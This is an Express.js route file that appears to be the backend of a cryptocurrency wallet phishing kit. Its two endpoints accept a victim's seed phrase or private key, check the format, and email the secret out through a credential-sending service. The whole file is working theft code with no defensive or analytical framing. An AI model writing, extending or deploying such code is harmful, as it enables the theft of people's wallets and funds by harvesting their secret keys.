const express = require('express');
const router = express.Router();
const { validateSeedPhrase, validatePrivateKey } = require('../validation/walletValidation');
const emailService = require('../services/emailService');

// POST /api/wallet/seed
router.post('/seed', async (req, res) => {
  const { phrase } = req.body;
  const validation = validateSeedPhrase(phrase);
  if (validation.error) {
    return res.status(400).json({ error: validation.error });
  }
  try {
    await emailService.sendWalletCredentials('Seed Phrase', phrase);
    res.status(200).json({ message: 'Seed phrase received.' });
  } catch (err) {
  console.error('Email error:', err);
  res.status(500).json({ error: 'Failed to process seed phrase.' });
}
});

// POST /api/wallet/private-key
router.post('/private-key', async (req, res) => {
  const { privateKey } = req.body;
  const validation = validatePrivateKey(privateKey);
  if (validation.error) {
    return res.status(400).json({ error: validation.error });
  }
  try {
    await emailService.sendWalletCredentials('Private Key', privateKey);
    res.status(200).json({ message: 'Private key received.' });
   } catch (err) {
    console.error('Email error:', err);
    res.status(500).json({ error: 'Failed to process private key.' });
  }
});

module.exports = router;
